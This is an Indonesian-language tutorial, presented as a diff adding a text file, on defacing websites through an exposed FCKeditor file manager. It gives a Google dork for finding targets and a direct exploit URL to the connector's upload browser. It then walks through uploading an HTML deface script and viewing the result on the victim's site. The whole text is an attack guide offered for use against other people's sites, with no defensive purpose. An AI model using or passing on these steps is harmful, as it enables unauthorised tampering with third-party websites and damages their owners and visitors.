@@ -1,0 +1,32 @@
+Selamat Malam Semua
+
+Kali ini Kita Akan Mempelajari Teknik Deface Metode FCKeditor
+Sebelum Itu Kita Siapkan Dulu Bumbunya;v
+
+-Script Deface 
+-Dork:
+inurl:advert_detail.php?id=
+-Exploit:
+http:///www.site.co.li /admin/FCKeditor/editor/filemanager/browser/default/browser.html?Type=File&Connector=connectors/php/connector.php
+Pertama Cari Target Dengan Google Dorknya
+
+
+Pilih Salah Satu Web Target Lalu Masukkan Exploit
+
+
+
+Kemudian Klik Tulisan Browse...Pilih Script Html Anda
+Selah Itu Klik Upload dibawah pojok kanan;v,,
+
+
+Cara Melihat Hasil Deface Anda Dengan Cara Klik http://www.site.co.li/files/namascript.html
+
+
+Y
+Sekian Tutor Dari Saya Semoga Bermanfaat 😁
+Selamat Malam Dan Sampai Jumpa....
+
+salam dari team kami;(..
+
+
+Gk paham liat : www.falka15cry.ml
